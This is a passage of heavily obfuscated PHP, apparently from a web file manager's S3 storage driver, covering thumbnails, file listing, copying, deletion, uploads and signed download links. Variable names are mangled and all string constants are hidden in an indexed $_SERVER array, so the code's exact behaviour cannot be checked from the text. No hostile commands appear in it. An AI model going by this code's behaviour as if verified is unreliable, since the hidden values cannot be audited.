$éü©Ìõ´; } public function fileOutImage($ÄÀªøµˆ, $Â“”¨×Í = 250) { $Ù”¨œàú =& $_SERVER[® ¨Ä®ñ]; set_timeout(); if (substr($ÄÀªøµˆ, 0, 4) == $Ù”¨œàú[145]) { $this->fileOutLink($ÄÀªøµˆ); } $¶»ÍéüÖ = $this->info($ÄÀªøµˆ); $£öË‘ = $¶»ÍéüÖ[$Ù”¨œàú[32]]; $«ê€¡œ = !1; if (isset($GLOBALS[$Ù”¨œàú[161]]) && $GLOBALS[$Ù”¨œàú[161]][$Ù”¨œàú[78]] == $¶»ÍéüÖ[$Ù”¨œàú[78]]) { $Öèº‹åØ = $GLOBALS[$Ù”¨œàú[161]][$Ù”¨œàú[162]]; if (!$¶»ÍéüÖ[$Ù”¨œàú[163]]) { $¶»ÍéüÖ[$Ù”¨œàú[163]] = $GLOBALS[$Ù”¨œàú[161]]; } if (isset($Öèº‹åØ[$Ù”¨œàú[164]])) { if ($Öèº‹åØ[$Ù”¨œàú[164]] <= $Â“”¨×Í && $Öèº‹åØ[$Ù”¨œàú[165]] <= $Â“”¨×Í) { $«ê€¡œ = !0; } } $£öË‘ = $¶»ÍéüÖ[$Ù”¨œàú[163]][$Ù”¨œàú[32]]; } if ($¶»ÍéüÖ[$Ù”¨œàú[80]] <= 1024 * 50 || $«ê€¡œ || !function_exists($Ù”¨œàú[166]) || $¶»ÍéüÖ[$Ù”¨œàú[167]] == $Ù”¨œàú[168]) { return $this->fileOut($ÄÀªøµˆ, !1, $£öË‘); } if (isset($¶»ÍéüÖ[$Ù”¨œàú[163]][$Ù”¨œàú[169]])) { $ò­ÚİšÀ = $¶»ÍéüÖ[$Ù”¨œàú[163]][$Ù”¨œàú[169]]; } else { if (isset($¶»ÍéüÖ[$Ù”¨œàú[163]][$Ù”¨œàú[170]])) { $ò­ÚİšÀ = $¶»ÍéüÖ[$Ù”¨œàú[163]][$Ù”¨œàú[170]]; } else { $ò­ÚİšÀ = md5("{$¶»ÍéüÖ[$Ù”¨œàú[32]]}\137{$¶»ÍéüÖ[$Ù”¨œàú[78]]}\137{$¶»ÍéüÖ[$Ù”¨œàú[80]]}"); } } $¯¤¨´æ¹ = "{$ò­ÚİšÀ}\137{$Â“”¨×Í}\56\x70\156\147"; if (!($µ˜í™å´ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Ù”¨œàú[171]))) { $ˆ½Àøå  = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Ù”¨œàú[172]); } else { $ˆ½Àøå  = KodIO::make($µ˜í™å´); } if ($µ˜í™å´ = IO::fileNameExist($ˆ½Àøå , $¯¤¨´æ¹)) { $î‘ï÷Ÿú = KodIO::make($µ˜í™å´); return IO::fileOut($î‘ï÷Ÿú, !1, $£öË‘); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $î‘ï÷Ÿú = DATA_THUMB . $¯¤¨´æ¹; del_file($î‘ï÷Ÿú); if (!@file_exists($î‘ï÷Ÿú)) { $×¶ù¤©í = TEMP_FILES; if (!is_dir($×¶ù¤©í)) { mk_dir($×¶ù¤©í); } $Ç®‰§’¦ = $×¶ù¤©í . $ò­ÚİšÀ . $Ù”¨œàú[10] . $¶»ÍéüÖ[$Ù”¨œàú[167]]; if (!@file_exists($Ç®‰§’¦)) { $Ç®‰§’¦ = $this->download($ÄÀªøµˆ, $Ç®‰§’¦); } ImageThumb::createThumb($Ç®‰§’¦, $î‘ï÷Ÿú, $Â“”¨×Í, $Â“”¨×Í * 10); } if (!file_exists($î‘ï÷Ÿú) || filesize($î‘ï÷Ÿú) < 100) { return @file_exists($Ç®‰§’¦) ? IO::fileOut($Ç®‰§’¦) : $this->fileOut($ÄÀªøµˆ); } if (!($ÂœãËÊ = IO::move($î‘ï÷Ÿú, $ˆ½Àøå ))) { return IO::fileOut($î‘ï÷Ÿú); } del_file($î‘ï÷Ÿú); IO::fileOut($ÂœãËÊ); } public function fileOutImageServer($’°‹ôÂ , $ÆÛè­Ü = 250) { $this->fileOutImage($’°‹ôÂ , $ÆÛè­Ü); } public function fileNameAuto($İ¤Ù—À, $ì¥Ò·¤ú, $ °ªğ€ƒ = REPEAT_RENAME, $©ÂÑõÙ = false) { $­™ˆ×‡ =& $_SERVER[® ¨Ä®ñ]; $¸çøŠÜÈ = $İ¤Ù—À === $­™ˆ×‡[12] ? $ì¥Ò·¤ú : rtrim($İ¤Ù—À, $­™ˆ×‡[8]) . $­™ˆ×‡[8] . $ì¥Ò·¤ú; if ($ °ªğ€ƒ == REPEAT_REPLACE || !$this->exist($¸çøŠÜÈ) || $©ÂÑõÙ && $ °ªğ€ƒ != REPEAT_RENAME_FOLDER) { return $ì¥Ò·¤ú; } if ($ °ªğ€ƒ == REPEAT_SKIP) { return !1; } $ô²ú“Âö = $­™ˆ×‡[10] . get_path_ext($ì¥Ò·¤ú); $ô²ú“Âö = $ô²ú“Âö == $­™ˆ×‡[10] || $©ÂÑõÙ ? $­™ˆ×‡[12] : $ô²ú“Âö; $äî½î = 1; $²­ƒ˜¡ğ = substr($ì¥Ò·¤ú, 0, strlen($ì¥Ò·¤ú) - strlen($ô²ú“Âö)); $ÎÄËËû = $²­ƒ˜¡ğ . "\50{$äî½î}\51{$ô²ú“Âö}"; while ($this->exist(rtrim($İ¤Ù—À, $­™ˆ×‡[8]) . $­™ˆ×‡[8] . $ÎÄËËû)) { $ÎÄËËû = $²­ƒ˜¡ğ . "\50{$äî½î}\51{$ô²ú“Âö}"; $äî½î++; } return $ÎÄËËû; } private function fileNameAutoList($ĞÛÚò¢›, $Ÿ“êÛãï, $èÁ¸‹–µ = false) { $Ü£ºç¬ =& $_SERVER[® ¨Ä®ñ]; $éØïÏû± = $this->listPath($ĞÛÚò¢›, !0); $éØïÏû± = array_merge($éØïÏû±[$Ü£ºç¬[77]], $éØïÏû±[$Ü£ºç¬[76]]); $êê¤¤Ù¦ = array_to_keyvalue($éØïÏû±, $Ü£ºç¬[12], $Ü£ºç¬[32]); $¦É®¦ğÙ = $Ü£ºç¬[10] . get_path_ext($Ÿ“êÛãï); $¦É®¦ğÙ = $¦É®¦ğÙ == $Ü£ºç¬[10] || $èÁ¸‹–µ ? $Ü£ºç¬[12] : $¦É®¦ğÙ; $ÏÖŞóØø = substr($Ÿ“êÛãï, 0, strlen($Ÿ“êÛãï) - strlen($¦É®¦ğÙ)); $€¡×ÃŒ· = $ÏÖŞóØø . "\50\x30\x29{$¦É®¦ğÙ}"; for ($ì†ä® = 1; $ì†ä® <= count($êê¤¤Ù¦) + 1; $ì†ä®++) { $€¡×ÃŒ· = $ÏÖŞóØø . "\50{$ì†ä®}\51{$¦É®¦ğÙ}"; if (!in_array_not_case($€¡×ÃŒ·, $êê¤¤Ù¦)) { return $€¡×ÃŒ·; } } return $€¡×ÃŒ·; } public function listAllFiles($¸øøàœ¯, $áìÊö×½, $”¦ãÊı = array()) { $İ’ÖáîÀ =& $_SERVER[® ¨Ä®ñ]; if (empty($áìÊö×½)) { return array(); } $ÏŸœ„—­ = array(); $¸øøàœ¯ = trim($¸øøàœ¯, $İ’ÖáîÀ[8]); foreach ($áìÊö×½ as $öƒúş¦€) { $³€äê¯ƒ = ltrim(substr(trim($öƒúş¦€, $İ’ÖáîÀ[8]), strlen($¸øøàœ¯)), $İ’ÖáîÀ[8]); $ÏŸœ„—­ = array_merge($ÏŸœ„—­, $this->slicePath($³€äê¯ƒ)); } $Îî°²½Ì = array(); foreach (array_unique($ÏŸœ„—­) as $öƒúş¦€) { $ò§ÈªªÒ = array($İ’ÖáîÀ[78] => $this->getPathOuter($İ’ÖáîÀ[8] . $¸øøàœ¯ . $İ’ÖáîÀ[8] . $öƒúş¦€), $İ’ÖáîÀ[79] => 1, $İ’ÖáîÀ[80] => 0); if (substr($öƒúş¦€, -1) != $İ’ÖáîÀ[8]) { $ò§ÈªªÒ[$İ’ÖáîÀ[79]] = 0; $’Ïï±ç˜ = $this->getPath($¸øøàœ¯ . $İ’ÖáîÀ[8] . $öƒúş¦€); $ò§ÈªªÒ[$İ’ÖáîÀ[80]] = isset($”¦ãÊı[$’Ïï±ç˜]) ? $”¦ãÊı[$’Ïï±ç˜] : $this->size($’Ïï±ç˜); } $Îî°²½Ì[] = $ò§ÈªªÒ; } return $Îî°²½Ì; } public function slicePath($ı´ÚÏ¼œ) { $´“¿€²û =& $_SERVER[® ¨Ä®ñ]; $¦™’ƒÊ = explode($´“¿€²û[8], trim($ı´ÚÏ¼œ, $´“¿€²û[8])); $‚“„åÖ£ = 0; do { ++$‚“„åÖ£; $ƒ®§…°ò[] = implode($´“¿€²û[8], array_slice($¦™’ƒÊ, 0, $‚“„åÖ£)) . $´“¿€²û[8]; } while ($‚“„åÖ£ < count($¦™’ƒÊ)); $ƒ®§…°ò[count($¦™’ƒÊ) - 1] = $ı´ÚÏ¼œ; return $ƒ®§…°ò; } public function getHost() { $„Ì•Ò¼ê =& $_SERVER[® ¨Ä®ñ]; $¡Ñ›İ = parse_url(trim($this->domain, $„Ì•Ò¼ê[8])); $Õ½…€æ = isset($¡Ñ›İ[$„Ì•Ò¼ê[173]]) ? $¡Ñ›İ[$„Ì•Ò¼ê[173]] : http_type(); $± û‰Ú­ = isset($¡Ñ›İ[$„Ì•Ò¼ê[174]]) ? $¡Ñ›İ[$„Ì•Ò¼ê[174]] : $¡Ñ›İ[$„Ì•Ò¼ê[78]]; if (isset($¡Ñ›İ[$„Ì•Ò¼ê[175]])) { $± û‰Ú­ .= $„Ì•Ò¼ê[4] . $¡Ñ›İ[$„Ì•Ò¼ê[175]]; } return $Õ½…€æ . $„Ì•Ò¼ê[176] . $± û‰Ú­; } public function pathEncode($¤·¦Ä) { $ù´©×¸œ =& $_SERVER[® ¨Ä®ñ]; return str_replace($ù´©×¸œ[177], $ù´©×¸œ[8], rawurlencode($¤·¦Ä)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($“«ê‘šÑ) { set_timeout(); require_once SDK_DIR . $_SERVER[® ¨Ä®ñ][178]; parent::__construct(); $this->_init($“«ê‘šÑ); } public function _init($„şæï—ö) { foreach ($„şæï—ö as $Ÿè´Ò¯Ş => $ ½üíÏá) { if (isset($this->{$Ÿè´Ò¯Ş})) { $this->{$Ÿè´Ò¯Ş} = $ ½üíÏá; } } $this->endpoint = $„şæï—ö[$_SERVER[® ¨Ä®ñ][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Í·œ•Ú˜ = "\x76\64") { $this->signVer = $Í·œ•Ú˜; $this->client->setSignatureVersion($Í·œ•Ú˜); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $’û‰ø“” =& $_SERVER[® ¨Ä®ñ]; $ ù±şæõ = $this->getBucketCors(); if (!$ ù±şæõ || !is_array($ ù±şæõ)) { return !1; } if ($ ù±şæõ[$’û‰ø“”[180]] != $’û‰ø“”[181] || $ ù±şæõ[$’û‰ø“”[182]] != $’û‰ø“”[181]) { return !1; } $•¿ÔåÆ³ = array_map($’û‰ø“”[183], $ ù±şæõ[$’û‰ø“”[184]]); if (!is_array($•¿ÔåÆ³)) { $•¿ÔåÆ³ = array(); } $şê¢ª“­ = array($’û‰ø“”[185], $’û‰ø“”[186], $’û‰ø“”[187], $’û‰ø“”[188], $’û‰ø“”[189]); $Ôœ¶ù—í = array_diff($şê¢ª“­, $•¿ÔåÆ³); return empty($Ôœ¶ù—í); } public function mkfile($¬ÍÉ‹Şó, $¤³¹øúö = '', $ÊÔüí½ç = REPEAT_RENAME) { $ë§‚óø¯ = $this->setContent($¬ÍÉ‹Şó, $¤³¹øúö); if ($ë§‚óø¯ !== !1) { return $this->getPathOuter($¬ÍÉ‹Şó); } return !1; } public function mkdir($öà””éÈ, $À°Ö¤œ„ = REPEAT_SKIP) { $Ç¨ŠÒ»ø =& $_SERVER[® ¨Ä®ñ]; if (empty($öà””éÈ) && $öà””éÈ !== $Ç¨ŠÒ»ø[190]) { return !1; } if ($this->_isFolder($öà””éÈ)) { return $this->getPathOuter($öà””éÈ); } $Ìı“õ®ì = $this->setContent($öà””éÈ, $Ç¨ŠÒ»ø[12], !0); if ($Ìı“õ®ì !== !1) { return $this->getPathOuter($öà””éÈ); } return !1; } public function copyFile($ÛùÖ§î§, $ÆàªÜ·¥, $¿ûÉÏà¢ = array()) { $»º’²ñ¢ =& $_SERVER[® ¨Ä®ñ]; $µ© ºŸÇ = $this->objectMeta($ÛùÖ§î§); if (!$µ© ºŸÇ) { return !1; } if ($µ© ºŸÇ[$»º’²ñ¢[80]] <= 1024 * 1024 * 200) { $´ï÷ÍÓ = $this->client->copyObject($this->bucket, $ÛùÖ§î§, $this->bucket, $ÆàªÜ·¥, $»º’²ñ¢[191], $¿ûÉÏà¢); } else { $´ï÷ÍÓ = $this->client->multiCopyObject($this->bucket, $ÛùÖ§î§, $this->bucket, $ÆàªÜ·¥, $¿ûÉÏà¢); } $´ï÷ÍÓ = $´ï÷ÍÓ ? $this->getPathOuter($ÆàªÜ·¥) : !1; return $´ï÷ÍÓ; } public function moveFile($ÆŸ•’åÈ, $š©âç«ˆ) { if ($this->copyFile($ÆŸ•’åÈ, $š©âç«ˆ)) { $this->delFile($ÆŸ•’åÈ); return $this->getPathOuter($š©âç«ˆ); } return !1; } public function delFile($Óùˆıºİ) { return $this->client->deleteObject($this->bucket, $Óùˆıºİ); } public function delFolder($éÅé¶Á˜) { $‡ñˆÎµ =& $_SERVER[® ¨Ä®ñ]; if (!$this->exist($éÅé¶Á˜)) { return !0; } $this->listItemCache = !1; $ƒùÓÓ  = $this->fileList($éÅé¶Á˜); $this->listItemCache = !0; $ĞØçğÉ» = trim($éÅé¶Á˜, $‡ñˆÎµ[8]) . $‡ñˆÎµ[8]; if (!empty($éÅé¶Á˜) && $éÅé¶Á˜ !== $‡ñˆÎµ[190] && !in_array($ĞØçğÉ», $ƒùÓÓ [$‡ñˆÎµ[77]])) { $ƒùÓÓ [$‡ñˆÎµ[77]][] = $ĞØçğÉ»; } $»Ò²¹ = $this->delByBatch($ƒùÓÓ [$‡ñˆÎµ[76]]); if (!$»Ò²¹) { return !1; } $»Ò²¹ = $this->delByBatch($ƒùÓÓ [$‡ñˆÎµ[77]]); if (!$»Ò²¹) { return !1; } return $this->delFile($ĞØçğÉ»); } private function delByBatch($ü§ñÑŠó) { foreach (array_chunk($ü§ñÑŠó, 1000) as $›“èìŞÎ) { $¨ñ®±Í‘ = $this->client->deleteObjects($this->bucket, $›“èìŞÎ); if (!$¨ñ®±Í‘) { return !1; } } return !0; } public function rename($±—·Í¼, $»«³–Ô¤) { return $this->renameObject($±—·Í¼, $»«³–Ô¤); } public function listPath($ÔÁÁ€èÒ, $³ÊÅ¸´Ú = false) { $­¿£“¨Û =& $_SERVER[® ¨Ä®ñ]; $ŠÙ®üÀ“ = $this->fileList($ÔÁÁ€èÒ, $­¿£“¨Û[8], !0); foreach ($ŠÙ®üÀ“[$­¿£“¨Û[77]] as $ôç‹ª‡• => $×ïØ¹ä‡) { $ŠÙ®üÀ“[$­¿£“¨Û[77]][$ôç‹ª‡•] = $this->folderInfo($×ïØ¹ä‡, $³ÊÅ¸´Ú); } foreach ($ŠÙ®üÀ“[$­¿£“¨Û[76]] as $ôç‹ª‡• => $×ïØ¹ä‡) { $ŠÙ®üÀ“[$­¿£“¨Û[76]][$ôç‹ª‡•] = $this->fileInfo($×ïØ¹ä‡[$­¿£“¨Û[32]], $³ÊÅ¸´Ú, $×ïØ¹ä‡); } return $ŠÙ®üÀ“; } private function fileInfo($İ«¯­‹, $ğª‚Ä§ = false, $ÊÊ‡š½ö = array()) { $‹ıèòÙ„ =& $_SERVER[® ¨Ä®ñ]; $şŞ­ª› = array($‹ıèòÙ„[32] => $this->pathThis($İ«¯­‹), $‹ıèòÙ„[78] => $this->getPathOuter($İ«¯­‹), $‹ıèòÙ„[33] => $‹ıèòÙ„[192], $‹ıèòÙ„[167] => $this->ext($İ«¯­‹), $‹ıèòÙ„[80] => isset($ÊÊ‡š½ö[$‹ıèòÙ„[80]]) ? $ÊÊ‡š½ö[$‹ıèòÙ„[80]] : 0); if ($ğª‚Ä§) { return $şŞ­ª›; } $şŞ­ª›[$‹ıèòÙ„[193]] = $şŞ­ª›[$‹ıèòÙ„[86]] = 0; $şŞ­ª›[$‹ıèòÙ„[194]] = $şŞ­ª›[$‹ıèòÙ„[195]] = !0; if (empty($ÊÊ‡š½ö)) { $ÊÊ‡š½ö = $this->objectMeta($İ«¯­‹); if (!$ÊÊ‡š½ö) { return $şŞ­ª›; } } if (isset($ÊÊ‡š½ö[$‹ıèòÙ„[196]])) { $şŞ­ª›[$‹ıèòÙ„[86]] = $ÊÊ‡š½ö[$‹ıèòÙ„[196]]; } if (isset($ÊÊ‡š½ö[$‹ıèòÙ„[80]])) { $şŞ­ª›[$‹ıèòÙ„[80]] = $ÊÊ‡š½ö[$‹ıèòÙ„[80]]; } return $şŞ­ª›; } private function folderInfo($à£³˜Å, $ÏıäéÕ¹ = false) { $Ï…ƒ…íØ =& $_SERVER[® ¨Ä®ñ]; $¾úŞˆ = array($Ï…ƒ…íØ[32] => $this->pathThis($à£³˜Å), $Ï…ƒ…íØ[78] => $this->getPathOuter($Ï…ƒ…íØ[8] . $à£³˜Å), $Ï…ƒ…íØ[33] => $Ï…ƒ…íØ[79]); if ($ÏıäéÕ¹) { return $¾úŞˆ; } $¾úŞˆ[$Ï…ƒ…íØ[193]] = $¾úŞˆ[$Ï…ƒ…íØ[86]] = 0; $¾úŞˆ[$Ï…ƒ…íØ[194]] = $¾úŞˆ[$Ï…ƒ…íØ[195]] = !0; if ($à£³˜Å == $Ï…ƒ…íØ[12]) { return $¾úŞˆ; } $à£³˜Å = trim($à£³˜Å, $Ï…ƒ…íØ[8]) . $Ï…ƒ…íØ[8]; $¯»õ’ü¯ = $this->objectMeta($à£³˜Å); if (isset($¯»õ’ü¯[$Ï…ƒ…íØ[196]])) { $¾úŞˆ[$Ï…ƒ…íØ[193]] = $¯»õ’ü¯[$Ï…ƒ…íØ[196]]; } return $¾úŞˆ; } private function fileList($”…à’ß£, $²ş«ãœö = '', $œ¨ó×ë¦ = 0) { $—íÀ˜¯º =& $_SERVER[® ¨Ä®ñ]; $çˆğˆúû = rtrim($”…à’ß£, $—íÀ˜¯º[8]) . $—íÀ˜¯º[8]; $­Ÿ¼À˜® = $this->listObjs($çˆğˆúû, null, null, $²ş«ãœö); if (!$­Ÿ¼À˜®) { return array($—íÀ˜¯º[77] => array(), $—íÀ˜¯º[76] => array()); } $ÓîÍœâ = $this->listItemCache === !1 ? !1 : !0; $€Íé±Ğ = $Ôƒ»Û¾È = array(); foreach ($­Ÿ¼À˜®[$—íÀ˜¯º[197]] as $¡·¸òîÌ) { $ÛÃ´£Ùœ = $¡·¸òîÌ[$—íÀ˜¯º[32]]; if ($ÛÃ´£Ùœ == $çˆğˆúû) { continue; } $”ğÒ˜£ = isset($¡·¸òîÌ[$—íÀ˜¯º[80]]) ? $¡·¸òîÌ[$—íÀ˜¯º[80]] : 0; $«÷õûƒ = $”ğÒ˜£ == 0 && substr($ÛÃ´£Ùœ, strlen($ÛÃ´£Ùœ) - 1, 1) == $—íÀ˜¯º[8] ? !0 : !1; if ($ÓîÍœâ) { $this->cacheMethod($—íÀ˜¯º[198], $ÛÃ´£Ùœ, $«÷õûƒ); $this->cacheMethod($—íÀ˜¯º[199], $ÛÃ´£Ùœ, $¡·¸òîÌ); } if ($«÷õûƒ) { $€Íé±Ğ[] = $ÛÃ´£Ùœ; continue; } $Ôƒ»Û¾È[] = $œ¨ó×ë¦ ? $¡·¸òîÌ : $ÛÃ´£Ùœ; } foreach ($­Ÿ¼À˜®[$—íÀ˜¯º[200]] as $¡·¸òîÌ) { $€Íé±Ğ[] = $¡·¸òîÌ[$—íÀ˜¯º[32]]; if ($ÓîÍœâ) { $this->cacheMethod($—íÀ˜¯º[198], $¡·¸òîÌ[$—íÀ˜¯º[32]], !0); } } if ($ÓîÍœâ) { $this->cacheMethod($—íÀ˜¯º[198], $”…à’ß£, !0); } return array($—íÀ˜¯º[77] => $€Íé±Ğ, $—íÀ˜¯º[76] => $Ôƒ»Û¾È); } private function listObjs($´¸˜“ƒ¸, $ğªĞ°¼æ = null, $Š¸ÕŒ¾ã = null, $•¼áƒğ  = null) { $¢¸Ä˜Œ‡ =& $_SERVER[® ¨Ä®ñ]; $´¸˜“ƒ¸ = trim($´¸˜“ƒ¸, $¢¸Ä˜Œ‡[8]); $ûªäªß = empty($´¸˜“ƒ¸) && $´¸˜“ƒ¸ !== $¢¸Ä˜Œ‡[190] ? $¢¸Ä˜Œ‡[12] : $´¸˜“ƒ¸ . $¢¸Ä˜Œ‡[8]; return $this->client->getBucket($this->bucket, $ûªäªß, $ğªĞ°¼æ, $Š¸ÕŒ¾ã, $•¼áƒğ , !0); } public function has($”ÊØ¹ªÂ, $š›¸± = false, $›Óíƒòú = true) { $ÅİÛÄøû =& $_SERVER[® ¨Ä®ñ]; $”ÊØ¹ªÂ = trim($”ÊØ¹ªÂ, $ÅİÛÄøû[8]); $×ÍĞÆç¬ = empty($”ÊØ¹ªÂ) && $”ÊØ¹ªÂ !== $ÅİÛÄøû[190] ? $ÅİÛÄøû[12] : $”ÊØ¹ªÂ . $ÅİÛÄøû[8]; $£®Ï¡°œ = null; $ŸÅº˜ = 500; $÷‘áéÖ´ = $ÅİÛÄøû[8]; $ê×ü¹²Û = $Ö¥ÖÂè‘ = array(); while (!0) { $è®ÒîÓ´ = $this->listObjs($”ÊØ¹ªÂ, $£®Ï¡°œ, $ŸÅº˜, $÷‘áéÖ´); if (!$è®ÒîÓ´) { break; } $£®Ï¡°œ = $è®ÒîÓ´[$ÅİÛÄøû[201]]; $ìÀòºÏó = $è®ÒîÓ´[$ÅİÛÄøû[197]]; $ÂÒœÕê‰ = $è®ÒîÓ´[$ÅİÛÄøû[200]]; if (empty($ìÀòºÏó) && empty($ÂÒœÕê‰)) { break; } if (count($ìÀòºÏó) == 1 && $ìÀòºÏó[0][$ÅİÛÄøû[32]] == $×ÍĞÆç¬) { break; } if ($š›¸±) { if (count($ìÀòºÏó)) { $ìÀòºÏó = array_column($ìÀòºÏó, $ÅİÛÄøû[32]); $ê×ü¹²Û = array_merge($ê×ü¹²Û, $ìÀòºÏó); } if (count($ÂÒœÕê‰)) { $ÂÒœÕê‰ = array_column($ÂÒœÕê‰, $ÅİÛÄøû[32]); $Ö¥ÖÂè‘ = array_merge($Ö¥ÖÂè‘, $ÂÒœÕê‰); } if ($£®Ï¡°œ === null) { break; } continue; } if ($›Óíƒòú) { if (!empty($ìÀòºÏó)) { if (count($ìÀòºÏó) > 1 || isset($ìÀòºÏó[0][$ÅİÛÄøû[32]]) && $ìÀòºÏó[0][$ÅİÛÄøû[32]] != $×ÍĞÆç¬) { return !0; } } } else { if (!empty($ÂÒœÕê‰)) { return !0; } } if ($£®Ï¡°œ === null) { break; } } if ($š›¸±) { $ê×ü¹²Û = array_diff($ê×ü¹²Û, array($×ÍĞÆç¬)); $ê×ü¹²Û = count(array_unique($ê×ü¹²Û)); $Ö¥ÖÂè‘ = count(array_unique($Ö¥ÖÂè‘)); return array($ÅİÛÄøû[202] => $ê×ü¹²Û, $ÅİÛÄøû[203] => $Ö¥ÖÂè‘); } return !1; } public function listAll($²ªï”å¾) { $òÌçŞ¸Õ =& $_SERVER[® ¨Ä®ñ]; $¡­ñ³ë° = $this->fileList($²ªï”å¾, $òÌçŞ¸Õ[12], !0); $ïÉ½¼‡‡ = array(); foreach ($¡­ñ³ë°[$òÌçŞ¸Õ[76]] as $…ÅÏ”ÜÚ) { $ïÉ½¼‡‡[$…ÅÏ”ÜÚ[$òÌçŞ¸Õ[32]]] = $…ÅÏ”ÜÚ[$òÌçŞ¸Õ[80]]; } foreach ($¡­ñ³ë°[$òÌçŞ¸Õ[77]] as $…ÅÏ”ÜÚ) { if (is_string($…ÅÏ”ÜÚ)) { $ïÉ½¼‡‡[$…ÅÏ”ÜÚ] = 0; } } return $this->listAllFiles($²ªï”å¾, array_keys($ïÉ½¼‡‡), $ïÉ½¼‡‡); } public function canRead($“±»ñ©—) { $Ş’øŒÂ =& $_SERVER[® ¨Ä®ñ]; $Ò¶—õØË = $this->client->getAccessControlPolicy($this->bucket, $“±»ñ©—); if (!$Ò¶—õØË) { return !1; } return in_array($Ò¶—õØË, array($Ş’øŒÂ[204], $Ş’øŒÂ[205], $Ş’øŒÂ[206])) ? !0 : !1; } public function canWrite($Ùæ°ÕÖ) { $§·™¢Ä =& $_SERVER[® ¨Ä®ñ]; $œ¯«‰Ã± = $this->client->getAccessControlPolicy($this->bucket, $Ùæ°ÕÖ); if (!$œ¯«‰Ã±) { return !1; } return in_array($œ¯«‰Ã±, array($§·™¢Ä[204], $§·™¢Ä[205])) ? !0 : !1; } public function getContent($„²¡ëÉ­) { return $this->client->getObject($this->bucket, $„²¡ëÉ­); } public function setContent($‰•¥ÅÓ, $¸íÄÆ½Ç = '', $üòšçÌ = false) { $–²†¹­À =& $_SERVER[® ¨Ä®ñ]; $‰•¥ÅÓ = $üòšçÌ ? trim($‰•¥ÅÓ, $–²†¹­À[8]) . $–²†¹­À[8] : $‰•¥ÅÓ; $ÏùÓÑÃ€ = get_file_mime(get_path_ext($‰•¥ÅÓ)); $¶Ê°ÎüÜ = $this->client->putObject($¸íÄÆ½Ç, $this->bucket, $‰•¥ÅÓ, $–²†¹­À[191], array(), $ÏùÓÑÃ€); if (!$¶Ê°ÎüÜ) { return !1; } if ($üòšçÌ) { return !0; } $this->cacheMethod(null, null); $¶Ê°ÎüÜ = $this->copyFile($‰•¥ÅÓ, $‰•¥ÅÓ, array($–²†¹­À[207] => $¶Ê°ÎüÜ[$–²†¹­À[208]])); return $¶Ê°ÎüÜ ? !0 : !1; } public function fileSubstr($™¿ûãß, $“š¿Ô×Ê, $ŸÕ÷”×) { $†å Šà = $“š¿Ô×Ê + $ŸÕ÷”× - 1; return $this->client->getObject($this->bucket, $™¿ûãß, array($_SERVER[® ¨Ä®ñ][209] => "\x62\x79\164\x65\163\x3d{$“š¿Ô×Ê}\x2d{$†å Šà}")); } public function upload($–øøáÃÂ, $‘ŒÇşÌ, $É°‡£÷¶ = false, $öš©·ßí = REPEAT_REPLACE) { $ëø¿Å‹ì =& $_SERVER[® ¨Ä®ñ]; $“êÊİÚÃ = array($ëø¿Å‹ì[207] => @md5_file($‘ŒÇşÌ)); $ª–Ê€ ñ = array($ëø¿Å‹ì[210] => get_file_mime(get_path_ext($–øøáÃÂ))); if (IO::size($‘ŒÇşÌ) <= 1024 * 1024 * 200) { $âó˜„Ø = $this->client->putObjectFile($‘ŒÇşÌ, $this->bucket, $–øøáÃÂ, $ëø¿Å‹ì[191], $“êÊİÚÃ, $ª–Ê€ ñ); return !empty($âó˜„Ø) ? $this->getPathOuter($–øøáÃÂ) : !1; } $¼°·ÍÂÒ = $this->client->multiUploadObject($‘ŒÇşÌ, $this->bucket, trim($–øøáÃÂ, $ëø¿Å‹ì[8]), $“êÊİÚÃ, $ª–Ê€ ñ); return $¼°·ÍÂÒ ? $this->getPathOuter($–øøáÃÂ) : !1; } public function download($¨Çã§ÅÀ, $”½²åœÂ) { if (!@is_dir($this->pathFather($”½²åœÂ)) && !IO::mkdir($this->pathFather($”½²åœÂ))) { return !1; } $µÑå‡¥“ = $this->client->getObject($this->bucket, $¨Çã§ÅÀ, array(), $”½²åœÂ); return $µÑå‡¥“ !== !1 ? $”½²åœÂ : !1; } public function link($·à¡ùà“, $İ˜İÚŞ½ = array()) { $ãÍåÕÓ½ =& $_SERVER[® ¨Ä®ñ]; if ($this->signVer == $ãÍåÕÓ½[211]) { return $this->client->getAuthenticatedURL($this->bucket, $·à¡ùà“, 3600 * 12, $İ˜İÚŞ½); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($·à¡ùà“, $ãÍåÕÓ½[8]), 3600 * 12, $this->region, array(), !0, $İ˜İÚŞ½); } public function fileOut($ÓßÎ½ÇÑ, $Éú–‘â‰ = false, $–Ñ„˜å = false, $û ÆÖëä = '') { $ŠÒğëüô =& $_SERVER[® ¨Ä®ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÓßÎ½ÇÑ, $Éú–‘â‰, $–Ñ„˜å, $û ÆÖëä); } if (!$–Ñ„˜å) { $–Ñ„˜å = $this->pathThis($ÓßÎ½ÇÑ); } $ÀïÔ€ËÏ = get_file_mime(get_path_ext($–Ñ„˜å)); if ($ÀïÔ€ËÏ == $ŠÒğëüô[212]) { return parent::fileOut($ÓßÎ½ÇÑ, $Éú–‘â‰, $–Ñ„˜å, $û ÆÖëä); } $¥ ‹ÒÂÅ = array($ŠÒğëüô[213] => $ÀïÔ€ËÏ); if ($Éú–‘â‰) { $¥ ‹ÒÂÅ[$ŠÒğëüô[214]] = $ŠÒğëüô[215] . rawurlencode($–Ñ„˜å); } else { } $ø„´š¯ = $this->link($ÓßÎ½ÇÑ, $¥ ‹ÒÂÅ); $this->fileOutLink($ø„´š¯); } public function fileOutServer($£ö‰Ù, $›•ËŸÖè = false, $úÅ»Ï˜¥ = false, $„—€•Ù‡ = '') { parent::fileOut($£ö‰Ù, $›•ËŸÖè, $úÅ»Ï˜¥, $„—€•Ù‡); } public function 